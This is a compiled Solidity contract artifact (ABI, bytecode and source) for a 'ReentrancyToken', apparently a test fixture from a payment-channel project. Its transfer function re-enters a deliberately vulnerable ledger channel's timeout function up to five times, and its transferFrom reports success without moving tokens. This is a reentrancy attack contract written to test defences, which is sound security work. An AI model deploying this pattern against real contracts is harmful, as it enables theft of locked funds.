{
  "contractName": "ReentrancyToken",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_spender",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "version",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "name": "balance",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_spender",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        },
        {
          "name": "_extraData",
          "type": "bytes"
        }
      ],
      "name": "approveAndCall",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        },
        {
          "name": "_spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "name": "remaining",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_initialAmount",
          "type": "uint256"
        },
        {
          "name": "_tokenName",
          "type": "string"
        },
        {
          "name": "_decimalUnits",
          "type": "uint8"
        },
        {
          "name": "_tokenSymbol",
          "type": "string"
        },
        {
          "name": "ledgerChannelAddress",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "numReentries",
          "type": "uint256"
        }
      ],
      "name": "FakeTransfer",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "_from",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "_to",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "_owner",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "_spender",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "createChannel",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_from",
          "type": "address"
        },
        {
          "name": "_to",
          "type": "address"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60c0604052600460808190527f48302e310000000000000000000000000000000000000000000000000000000060a090815261003e916006919061010b565b50600060085534801561005057600080fd5b50604051610adb380380610adb8339810160409081528151602080840151838501516060860151608087015133600090815260018652968720869055958590559186018051949690959194920192909186918691869186916100b8916003919086019061010b565b506004805460ff191660ff841617905580516100db90600590602084019061010b565b505060078054600160a060020a031916600160a060020a039590951694909417909355506101a695505050505050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061014c57805160ff1916838001178555610179565b82800160010185558215610179579182015b8281111561017957825182559160200191906001019061015e565b50610185929150610189565b5090565b6101a391905b80821115610185576000815560010161018f565b90565b610926806101b56000396000f3006080604052600436106100b95763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166306fdde0381146100bb578063095ea7b31461014557806318160ddd1461017d57806323b872dd146101a4578063313ce567146101ce578063423d4ef2146101f957806354fd4d501461020e57806370a082311461022357806395d89b4114610244578063a9059cbb14610259578063cae9ca511461027d578063dd62ed3e146102e6575b005b3480156100c757600080fd5b506100d061030d565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561010a5781810151838201526020016100f2565b50505050905090810190601f1680156101375780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015157600080fd5b50610169600160a060020a036004351660243561039b565b604080519115158252519081900360200190f35b34801561018957600080fd5b50610192610402565b60408051918252519081900360200190f35b3480156101b057600080fd5b50610169600160a060020a0360043581169060243516604435610408565b3480156101da57600080fd5b506101e3610411565b6040805160ff9092168252519081900360200190f35b34801561020557600080fd5b506100b961041a565b34801561021a57600080fd5b506100d0610538565b34801561022f57600080fd5b50610192600160a060020a0360043516610593565b34801561025057600080fd5b506100d06105ae565b34801561026557600080fd5b50610169600160a060020a0360043516602435610609565b34801561028957600080fd5b50604080516020600460443581810135601f8101849004840285018401909552848452610169948235600160a060020a03169460248035953695946064949201919081908401838280828437509497506107029650505050505050565b3480156102f257600080fd5b50610192600160a060020a03600435811690602435166108cf565b6003805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156103935780601f1061036857610100808354040283529160200191610393565b820191906000526020600020905b81548152906001019060200180831161037657829003601f168201915b505050505081565b336000818152600260209081526040808320600160a060020a038716808552908352818420869055815186815291519394909390927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925928290030190a35060015b92915050565b60005481565b60019392505050565b60045460ff1681565b600754604080518082018252670de0b6b3a76400008082526001602083015282517faeba142c0000000000000000000000000000000000000000000000000000000081527f10000000000000000000000000000000000000000000000000000000000000006004820181815273627306090abab3a6e1400e9345bc60c78a8bef57602484018190526000604485018190523060648601819052600160a060020a039099169863aeba142c989697949692959194909390929091608401908390808383895b838110156104f65781810151838201526020016104de565b50505050905001955050505050506000604051808303818588803b15801561051d57600080fd5b505af1158015610531573d6000803e3d6000fd5b5050505050565b6006805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156103935780601f1061036857610100808354040283529160200191610393565b600160a060020a031660009081526001602052604090205490565b6005805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156103935780601f1061036857610100808354040283529160200191610393565b6000600560085410151561061f575060016103fc565b600880546001019055600754604080517e2e1d7e0000000000000000000000000000000000000000000000000000000081527f100000000000000000000000000000000000000000000000000000000000000060048201529051600160a060020a0390921691622e1d7e9160248082019260009290919082900301818387803b1580156106ab57600080fd5b505af11580156106bf573d6000803e3d6000fd5b505060085460408051918252517fb09d585f14ca638953bc443817b5af48fabedb3189ad665ccba25e8b2bc1acd49350908190036020019150a150600192915050565b336000818152600260209081526040808320600160a060020a038816808552908352818420879055815187815291519394909390927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925928290030190a383600160a060020a031660405180807f72656365697665417070726f76616c28616464726573732c75696e743235362c81526020017f616464726573732c627974657329000000000000000000000000000000000000815250602e01905060405180910390207c01000000000000000000000000000000000000000000000000000000009004338530866040518563ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018085600160a060020a0316600160a060020a0316815260200184815260200183600160a060020a0316600160a060020a03168152602001828051906020019080838360005b8381101561087457818101518382015260200161085c565b50505050905090810190601f1680156108a15780820380516001836020036101000a031916815260200191505b509450505050506000604051808303816000875af19250505015156108c557600080fd5b5060019392505050565b600160a060020a039182166000908152600260209081526040808320939094168252919091522054905600a165627a7a723058200ebefa480712b2caa895e6dab68ceaff67d0e8f642969a5dd287824107607f310029",
  "source": "pragma solidity ^0.4.23;\n\nimport \"./HumanStandardToken.sol\";\n\nimport \"../../VulnerableLedgerChannel.sol\";\n\ncontract ReentrancyToken is HumanStandardToken {\n    VulnerableLedgerChannel ledgerChannel;\n    uint256 constant MAX_REENTRIES = 5;\n    uint256 numReentries = 0;\n\n    event FakeTransfer(uint256 numReentries);\n\n    constructor(\n        uint256 _initialAmount,\n        string _tokenName,\n        uint8 _decimalUnits,\n        string _tokenSymbol,\n        address ledgerChannelAddress\n    ) HumanStandardToken(\n        _initialAmount, \n        _tokenName, \n        _decimalUnits, \n        _tokenSymbol\n    ) public {\n        ledgerChannel = VulnerableLedgerChannel(ledgerChannelAddress);\n    }\n\n    function createChannel() public {\n        ledgerChannel.createChannel.value(1 ether)(\n            bytes32(0x1000000000000000000000000000000000000000000000000000000000000000),\n            address(0x627306090abaB3A6e1400e9345bC60c78a8BEf57),\n            0,\n            this,\n            [uint256(1000000000000000000), 1] // [eth, token]\n        );\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        if (numReentries >= MAX_REENTRIES) {\n            return true;\n        }\n        numReentries++;\n        ledgerChannel.LCOpenTimeout(bytes32(0x1000000000000000000000000000000000000000000000000000000000000000));\n        emit FakeTransfer(numReentries);\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n        return true;\n    }\n\n    function () external payable {\n    }\n}",
  "sourcePath": "/Users/rahul/Desktop/connext/connext-kernle/packages/contracts/contracts/lib/token/ReentrancyToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "3.0.0-beta.0",
  "updatedAt": "2018-10-12T22:50:11.024Z"
}